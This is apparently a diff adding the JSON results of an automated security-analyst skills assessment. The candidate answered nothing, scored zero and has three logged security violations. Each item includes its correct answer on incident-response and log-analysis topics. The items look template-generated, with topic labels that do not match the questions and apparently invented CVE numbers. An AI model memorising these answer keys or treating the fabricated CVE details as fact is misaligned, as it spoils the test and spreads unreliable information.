+        "max_score": 100.0,
+        "overall_percentage": 0.0,
+        "recommendation": "Do Not Proceed - significant gaps relative to role requirements.",
+        "category_breakdown": [
+          {
+            "category": "Python",
+            "score": 0.0,
+            "max_score": 50.0,
+            "percentage": 0.0
+          },
+          {
+            "category": "SQL",
+            "score": 0.0,
+            "max_score": 50.0,
+            "percentage": 0.0
+          }
+        ],
+        "question_results": [
+          {
+            "id": "q1",
+            "type": "code_analysis",
+            "category": "Python",
+            "prompt": "What is the most critical security issue in this Python-related code snippet?",
+            "answer": "",
+            "result": {
+              "score": 0,
+              "max_score": 5,
+              "percentage": 0.0,
+              "feedback": "Incorrect. Expected: B) TLS verification disabled and privileged role assignment without authorization checks",
+              "strengths": [],
+              "gaps": [
+                "Review the underlying concept in the rubric."
+              ],
+              "correct_answer": "B) TLS verification disabled and privileged role assignment without authorization checks"
+            }
+          },
+          {
+            "id": "q2",
+            "type": "aptitude",
+            "category": "Python",
+            "prompt": "A team must prioritize five SQL tasks with limited staff. Which approach best reflects strong operational judgment?",
+            "answer": "",
+            "result": {
+              "score": 0,
+              "max_score": 5,
+              "percentage": 0.0,
+              "feedback": "Incorrect. Expected: B) Prioritize by business impact, exploitability, and evidence strength",
+              "strengths": [],
+              "gaps": [
+                "Review the underlying concept in the rubric."
+              ],
+              "correct_answer": "B) Prioritize by business impact, exploitability, and evidence strength"
+            }
+          },
+          {
+            "id": "q3",
+            "type": "match_following",
+            "category": "SQL",
+            "prompt": "Match each SQL term to its best description.",
+            "answer": "",
+            "result": {
+              "score": 0.0,
+              "max_score": 5,
+              "percentage": 0.0,
+              "feedback": "Incorrect. Correct matches:\nSIEM -> Centralized log correlation and alerting platform\nIOC -> Artifact indicating potential compromise\nMTTR -> Mean time to remediate or respond\nEDR -> Endpoint telemetry and response tooling",
+              "strengths": [],
+              "gaps": [
+                "Mismatch in term assignments"
+              ],
+              "correct_answer": [
+                "SIEM -> Centralized log correlation and alerting platform",
+                "IOC -> Artifact indicating potential compromise",
+                "MTTR -> Mean time to remediate or respond",
+                "EDR -> Endpoint telemetry and response tooling"
+              ]
+            }
+          },
+          {
+            "id": "q4",
+            "type": "multi_select",
+            "category": "Python",
+            "prompt": "Which actions are appropriate when investigating a Python alert tied to user alee from 10.248.249.159? Select all that apply.",
+            "answer": "",
+            "result": {
+              "score": 0.0,
+              "max_score": 5,
+              "percentage": 0.0,
+              "feedback": "Incorrect. No options selected.",
+              "strengths": [],
+              "gaps": [
+                "Review the topic and select all correct choices."
+              ],
+              "correct_answer": [
+                "D) Check for lateral movement indicators",
+                "B) Preserve volatile evidence before major system changes",
+                "A) Review authentication and process logs for the account"
+              ]
+            }
+          },
+          {
+            "id": "q5",
+            "type": "code_analysis",
+            "category": "SQL",
+            "prompt": "What is the most critical security issue in this SQL-related code snippet?",
+            "answer": "",
+            "result": {
+              "score": 0,
+              "max_score": 5,
+              "percentage": 0.0,
+              "feedback": "Incorrect. Expected: B) TLS verification disabled and privileged role assignment without authorization checks",
+              "strengths": [],
+              "gaps": [
+                "Review the underlying concept in the rubric."
+              ],
+              "correct_answer": "B) TLS verification disabled and privileged role assignment without authorization checks"
+            }
+          },
+          {
+            "id": "q6",
+            "type": "threat_hunting",
+            "category": "Python",
+            "prompt": "You suspect lateral movement related to Python after seeing connections from host-8050ed.corp.local to 138.111.120.119. Describe a structured threat hunt.",
+            "answer": "",
+            "result": {
+              "score": 0.0,
+              "max_score": 5,
+              "percentage": 0.0,
+              "feedback": "No answer provided.",
+              "strengths": [],
+              "gaps": [
+                "Provide an answer to receive credit."
+              ]
+            }
+          },
+          {
+            "id": "q7",
+            "type": "terminal_analysis",
+            "category": "Python",
+            "prompt": "Based on this terminal session, what attack behavior is most likely occurring?",
+            "answer": "",
+            "result": {
+              "score": 0,
+              "max_score": 5,
+              "percentage": 0.0,
+              "feedback": "Incorrect. Expected: B) Remote payload retrieval with scheduled persistence",
+              "strengths": [],
+              "gaps": [
+                "Review the underlying concept in the rubric."
+              ],
+              "correct_answer": "B) Remote payload retrieval with scheduled persistence"
+            }
+          },
+          {
+            "id": "q8",
+            "type": "log_analysis",
+            "category": "SQL",
+            "prompt": "Which interpretation best fits this SQL log sequence?",
+            "answer": "",
+            "result": {
+              "score": 0,
+              "max_score": 5,
+              "percentage": 0.0,
+              "feedback": "Incorrect. Expected: B) Privilege use followed by potentially suspicious script execution",
+              "strengths": [],
+              "gaps": [
+                "Review the underlying concept in the rubric."
+              ],
+              "correct_answer": "B) Privilege use followed by potentially suspicious script execution"
+            }
+          },
+          {
+            "id": "q9",
+            "type": "true_false",
+            "category": "Python",
+            "prompt": "True or False: For Python, blocking 136.131.160.51 without investigation is always sufficient to close an incident.",
+            "answer": "",
+            "result": {
+              "score": 0.0,
+              "max_score": 5,
+              "percentage": 0.0,
+              "feedback": "Incorrect. Expected: False",
+              "strengths": [],
+              "gaps": [
+                "Review the concepts behind this True/False assertion."
+              ],
+              "correct_answer": "False"
+            }
+          },
+          {
+            "id": "q10",
+            "type": "multi_select",
+            "category": "SQL",
+            "prompt": "Which actions are appropriate when investigating a SQL alert tied to user devans from 10.140.197.179? Select all that apply.",
+            "answer": "",
+            "result": {
+              "score": 0.0,
+              "max_score": 5,
+              "percentage": 0.0,
+              "feedback": "Incorrect. No options selected.",
+              "strengths": [],
+              "gaps": [
+                "Review the topic and select all correct choices."
+              ],
+              "correct_answer": [
+                "A) Review authentication and process logs for the account",
+                "D) Check for lateral movement indicators",
+                "B) Preserve volatile evidence before major system changes"
+              ]
+            }
+          },
+          {
+            "id": "q11",
+            "type": "scenario",
+            "category": "SQL",
+            "prompt": "At 02:20 UTC, monitoring detects abnormal authentication for kpatel from 1.168.169.41 followed by access to a sensitive SQL system. Describe your investigation and containment plan for the first 30 minutes.",
+            "answer": "",
+            "result": {
+              "score": 0.0,
+              "max_score": 5,
+              "percentage": 0.0,
+              "feedback": "No answer provided.",
+              "strengths": [],
+              "gaps": [
+                "Provide an answer to receive credit."
+              ]
+            }
+          },
+          {
+            "id": "q12",
+            "type": "scenario",
+            "category": "Python",
+            "prompt": "At 02:20 UTC, monitoring detects abnormal authentication for mchen from 154.101.111.103 followed by access to a sensitive Python system. Describe your investigation and containment plan for the first 30 minutes.",
+            "answer": "",
+            "result": {
+              "score": 0.0,
+              "max_score": 5,
+              "percentage": 0.0,
+              "feedback": "No answer provided.",
+              "strengths": [],
+              "gaps": [
+                "Provide an answer to receive credit."
+              ]
+            }
+          },
+          {
+            "id": "q13",
+            "type": "mcq",
+            "category": "Python",
+            "prompt": "During review of activity involving Python, analysts observe a connection from 1.63.155.102 to 148.87.7.88 associated with CVE-2023-92681. What is the best immediate action?",
+            "answer": "",
+            "result": {
+              "score": 0,
+              "max_score": 5,
+              "percentage": 0.0,
+              "feedback": "Incorrect. Expected: B) Validate the alert, isolate affected assets if confirmed, and preserve evidence",
+              "strengths": [],
+              "gaps": [
+                "Review the underlying concept in the rubric."
+              ],
+              "correct_answer": "B) Validate the alert, isolate affected assets if confirmed, and preserve evidence"
+            }
+          },
+          {
+            "id": "q14",
+            "type": "aptitude",
+            "category": "SQL",
+            "prompt": "A team must prioritize five Python tasks with limited staff. Which approach best reflects strong operational judgment?",
+            "answer": "",
+            "result": {
+              "score": 0,
+              "max_score": 5,
+              "percentage": 0.0,
+              "feedback": "Incorrect. Expected: B) Prioritize by business impact, exploitability, and evidence strength",
+              "strengths": [],
+              "gaps": [
+                "Review the underlying concept in the rubric."
+              ],
+              "correct_answer": "B) Prioritize by business impact, exploitability, and evidence strength"
+            }
+          },
+          {
+            "id": "q15",
+            "type": "true_false",
+            "category": "SQL",
+            "prompt": "True or False: For SQL, blocking 220.196.123.67 without investigation is always sufficient to close an incident.",
+            "answer": "",
+            "result": {
+              "score": 0.0,
+              "max_score": 5,
+              "percentage": 0.0,
+              "feedback": "Incorrect. Expected: False",
+              "strengths": [],
+              "gaps": [
+                "Review the concepts behind this True/False assertion."
+              ],
+              "correct_answer": "False"
+            }
+          },
+          {
+            "id": "q16",
+            "type": "incident_response",
+            "category": "SQL",
+            "prompt": "A host at 10.214.255.167 is flagged for malware linked to CVE-2023-45777. Outline your incident response steps from detection through recovery.",
+            "answer": "",
+            "result": {
+              "score": 0.0,
+              "max_score": 5,
+              "percentage": 0.0,
+              "feedback": "No answer provided.",
+              "strengths": [],
+              "gaps": [
+                "Provide an answer to receive credit."
+              ]
+            }
+          },
+          {
+            "id": "q17",
+            "type": "match_following",
+            "category": "Python",
+            "prompt": "Match each Python term to its best description.",
+            "answer": "",
+            "result": {
+              "score": 0.0,
+              "max_score": 5,
+              "percentage": 0.0,
+              "feedback": "Incorrect. Correct matches:\nSIEM -> Centralized log correlation and alerting platform\nIOC -> Artifact indicating potential compromise\nMTTR -> Mean time to remediate or respond\nEDR -> Endpoint telemetry and response tooling",
+              "strengths": [],
+              "gaps": [
+                "Mismatch in term assignments"
+              ],
+              "correct_answer": [
+                "SIEM -> Centralized log correlation and alerting platform",
+                "IOC -> Artifact indicating potential compromise",
+                "MTTR -> Mean time to remediate or respond",
+                "EDR -> Endpoint telemetry and response tooling"
+              ]
+            }
+          },
+          {
+            "id": "q18",
+            "type": "mcq",
+            "category": "Python",
+            "prompt": "During review of activity involving Python, analysts observe a connection from 56.169.204.89 to 196.96.11.112 associated with CVE-2026-91476. What is the best immediate action?",
+            "answer": "",
+            "result": {
+              "score": 0,
+              "max_score": 5,
+              "percentage": 0.0,
+              "feedback": "Incorrect. Expected: B) Validate the alert, isolate affected assets if confirmed, and preserve evidence",
+              "strengths": [],
+              "gaps": [
+                "Review the underlying concept in the rubric."
+              ],
+              "correct_answer": "B) Validate the alert, isolate affected assets if confirmed, and preserve evidence"
+            }
+          },
+          {
+            "id": "q19",
+            "type": "fill_blank",
+            "category": "SQL",
+            "prompt": "A analyst needs to identify the host responsible for suspicious traffic to 208.29.194.29. The device MAC address is 54:2f:4d:03:21:84. Which command on a managed switch shows the port mapping?",
+            "answer": "",
+            "result": {
+              "score": 0.0,
+              "max_score": 5,
+              "percentage": 0.0,
+              "feedback": "Incorrect. Expected: show mac address-table",
+              "strengths": [],
+              "gaps": [
+                "Review the required terminology (Expected: show mac address-table)."
+              ],
+              "correct_answer": "show mac address-table"
+            }
+          },
+          {
+            "id": "q20",
+            "type": "mcq",
+            "category": "SQL",
+            "prompt": "During review of activity involving SQL, analysts observe a connection from 198.21.57.172 to 88.108.212.90 associated with CVE-2019-31728. What is the best immediate action?",
+            "answer": "",
+            "result": {
+              "score": 0,
+              "max_score": 5,
+              "percentage": 0.0,
+              "feedback": "Incorrect. Expected: B) Validate the alert, isolate affected assets if confirmed, and preserve evidence",
+              "strengths": [],
+              "gaps": [
+                "Review the underlying concept in the rubric."
+              ],
+              "correct_answer": "B) Validate the alert, isolate affected assets if confirmed, and preserve evidence"
+            }
+          }
+        ]
+      },
+      "security_violations": 3,
+      "submitted_late": false,
+      "late_seconds": 0
+    }
+  ]
+}
